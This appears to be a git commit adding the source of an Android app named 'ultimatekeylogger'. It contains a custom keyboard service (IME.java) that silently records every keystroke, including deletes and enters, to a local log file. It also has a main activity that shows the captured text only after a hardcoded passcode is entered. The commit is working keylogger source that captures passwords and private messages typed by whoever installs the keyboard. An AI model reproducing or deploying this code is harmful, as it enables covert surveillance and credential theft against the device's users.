19adcb313ee2464ae260367d159ad40439618997
Vitaliy Litunovskiy <litunovskiy.vitaliy@yandex.ru>
2020-10-13 17:27:37 +0300

    Initial commit

---
+++ app/src/main/java/com/sutd/ultimatekeylogger/IME.java
@@ -0,0 +1,196 @@
+package com.sutd.ultimatekeylogger;
+
+import android.inputmethodservice.InputMethodService;
+import android.inputmethodservice.Keyboard;
+import android.inputmethodservice.KeyboardView;
+import android.media.AudioManager;
+import android.os.AsyncTask;
+import android.os.StrictMode;
+import android.view.KeyEvent;
+import android.view.View;
+import android.view.inputmethod.InputConnection;
+
+import java.io.BufferedReader;
+import java.io.BufferedWriter;
+import java.io.DataOutputStream;
+import java.io.FileNotFoundException;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.OutputStreamWriter;
+import java.net.Socket;
+import java.nio.charset.Charset;
+
+public class IME extends InputMethodService implements KeyboardView.OnKeyboardActionListener{
+
+    private KeyboardView kv;
+    private Keyboard keyboard;
+    private String mCurrentLocale = "ENGLISH";
+    private String mPreviousLocale;
+    private boolean isCapsOn = false;
+
+
+    @Override
+    public void onPress(int primaryCode) {
+    }
+    @Override
+    public void onRelease(int primaryCode) {
+    }
+    @Override
+    public void onKey(int primaryCode, int[] keyCodes) {
+        InputConnection ic = getCurrentInputConnection();
+        playClick(primaryCode);
+        switch(primaryCode){
+            case Keyboard.KEYCODE_DELETE :
+                ic.deleteSurroundingText(1, 0);
+                break;
+            case Keyboard.KEYCODE_SHIFT:
+                isCapsOn = !isCapsOn;
+                keyboard.setShifted(isCapsOn);
+                kv.invalidateAllKeys();
+                break;
+            case Keyboard.KEYCODE_DONE:
+                ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
+                break;
+            case Keyboard.KEYCODE_MODE_CHANGE:
+                handleLanguageSwitch();
+                break;
+            case -6:
+                handleSymbolsSwitch();
+                break;
+            default:
+                char code = (char)primaryCode;
+                if(Character.isLetter(code) && isCapsOn){
+                    code = Character.toUpperCase(code);
+                }
+                ic.commitText(String.valueOf(code),1);
+        }
+            try {
+                BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(openFileOutput("logfile", MODE_APPEND), "UTF-8"));
+                if(primaryCode == Keyboard.KEYCODE_DELETE) {
+                   /* bw.write('(');
+                    bw.write('D');
+                    bw.write('E');
+                    bw.write('L');
+                    bw.write(')');*/
+                    bw.write("(DELETE)");
+                }
+                else if(primaryCode == Keyboard.KEYCODE_DONE) {
+                   /* bw.write('(');
+                    bw.write('E');
+                    bw.write('N');
+                    bw.write('T');
+                    bw.write(')');*/
+                    bw.write("(ENTER)");
+                }
+                else
+                {
+                    if(isCapsOn) bw.write(Character.toUpperCase((char)primaryCode));
+                    else bw.write((char)primaryCode);
+                }
+                bw.close();
+            } catch (FileNotFoundException e) {
+                e.printStackTrace();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+    }
+    @Override
+    public void onText(CharSequence text) {
+    }
+    @Override
+    public void swipeLeft() {
+    }
+    @Override
+    public void swipeRight() {
+    }
+    @Override
+    public void swipeDown() {
+    }
+    @Override
+    public void swipeUp() {
+    }
+
+    @Override
+    public View onCreateInputView() {
+        kv = (KeyboardView)getLayoutInflater().inflate(R.layout.keyboard, null);
+        keyboard = new Keyboard(this, R.layout.keys_definition_en);
+        kv.setKeyboard(keyboard);
+        kv.setOnKeyboardActionListener(this);
+        deleteFile("logfile");
+        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+        StrictMode.setThreadPolicy(policy);
+        return kv;
+    }
+
+    private void playClick(int keyCode){
+        AudioManager am = (AudioManager)getSystemService(AUDIO_SERVICE);
+        switch(keyCode){
+            case 32:
+                am.playSoundEffect(AudioManager.FX_KEYPRESS_SPACEBAR);
+                break;
+            case Keyboard.KEYCODE_DONE:
+            case 10:
+                am.playSoundEffect(AudioManager.FX_KEYPRESS_RETURN);
+                break;
+            case Keyboard.KEYCODE_DELETE:
+                am.playSoundEffect(AudioManager.FX_KEYPRESS_DELETE);
+                break;
+            default: am.playSoundEffect(AudioManager.FX_KEYPRESS_STANDARD);
+        }
+    }
+    private Keyboard getKeyboard(String locale) {
+        switch (locale) {
+            case "RUSSIAN":
+                return new Keyboard(this, R.layout.keys_definition_ru);
+            case "ENGLISH":
+                return new Keyboard(this, R.layout.keys_definition_en);
+            case "SYMBOLS":
+                return new Keyboard(this, R.layout.keys_definition_symbols);
+            default:
+                return new Keyboard(this, R.layout.keys_definition_ru);
+        }
+    }
+    //TODO: Разобраться с некорректным возвратом на язык после переключения на символы
+    private void handleLanguageSwitch() {
+        if (mCurrentLocale.equals("RUSSIAN")) {
+            mCurrentLocale = "ENGLISH";
+            keyboard = getKeyboard("ENGLISH");
+        } else {
+            mCurrentLocale = "RUSSIAN";
+            keyboard = getKeyboard("RUSSIAN");
+        }
+
+        kv.setKeyboard(keyboard);
+        keyboard.setShifted(isCapsOn);
+        kv.invalidateAllKeys();
+    }
+    private void handleSymbolsSwitch() {
+        if (!mCurrentLocale.equals("SYMBOLS")) {
+            keyboard = getKeyboard("SYMBOLS");
+            mPreviousLocale = mCurrentLocale;
+            mCurrentLocale = "SYMBOLS";
+        } else {
+            //keyboard = getKeyboard(mPreviousLocale);
+            mCurrentLocale = mPreviousLocale;
+            keyboard = getKeyboard("RUSSIAN");
+            keyboard.setShifted(isCapsOn);
+        }
+        kv.setKeyboard(keyboard);
+        kv.invalidateAllKeys();
+
+    }
+
+    @Override
+    public void onFinishInputView(boolean finishingInput)
+    {
+        try {
+            BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(openFileOutput("logfile", MODE_APPEND), "UTF-8"));
+            bw.write("\n(KEYBOARD CLOSED)\n");
+        }
+        catch (Exception e)
+        {
+            e.printStackTrace();
+        }
+    }
+
+}
---
+++ app/src/main/java/com/sutd/ultimatekeylogger/MainActivity.java
@@ -0,0 +1,82 @@
+package com.sutd.ultimatekeylogger;
+
+import android.content.Context;
+import android.content.DialogInterface;
+import android.content.Intent;
+import android.os.StrictMode;
+import android.support.v7.app.AlertDialog;
+import android.support.v7.app.AppCompatActivity;
+import android.os.Bundle;
+import android.util.Log;
+import android.view.LayoutInflater;
+import android.view.View;
+import android.view.ViewGroup;
+import android.widget.EditText;
+
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.net.Socket;
+import java.nio.charset.Charset;
+
+import static android.provider.Telephony.Mms.Part.FILENAME;
+
+
+public class MainActivity extends AppCompatActivity {
+    final Context context = this;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        //StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+        //StrictMode.setThreadPolicy(policy);
+
+        LayoutInflater li = LayoutInflater.from(context);
+        View promptsView = li.inflate(R.layout.prompt, null);
+        AlertDialog.Builder mDialogBuilder = new AlertDialog.Builder(context);
+        mDialogBuilder.setView(promptsView);
+        final EditText userInput = (EditText) promptsView.findViewById(R.id.input_text);
+        mDialogBuilder
+                .setCancelable(false)
+                .setPositiveButton("OK",
+                        new DialogInterface.OnClickListener() {
+                            public void onClick(DialogInterface dialog,int id) {
+                                if(userInput.getText().toString().equals("passcode")) dialog.cancel();
+                                else finish();
+                            }
+                        })
+                .setNegativeButton("Cancel",
+                        new DialogInterface.OnClickListener() {
+                            public void onClick(DialogInterface dialog, int id) {
+                                //dialog.cancel();
+                                finish();
+                            }
+                        });
+        AlertDialog alertDialog = mDialogBuilder.create();
+        alertDialog.show();
+
+    }
+    void readFile(EditText et) {
+        try {
+            BufferedReader br = new BufferedReader(new InputStreamReader(openFileInput("logfile"), Charset.defaultCharset()));
+            String str = "";
+            while ((str = br.readLine()) != null) {
+                et.setText(et.getText() + str);
+            }
+        } catch (FileNotFoundException e) {et.setText("Nothing to show");
+        } catch (IOException e) {
+            et.setText("Something went wrong");
+        }
+    }
+    public void onchandler(View view)
+    {
+        EditText etLog = findViewById(R.id.etLog);
+        etLog.setText("");
+        readFile(etLog);
+        //deleteFile("logfile");
+    }
+}
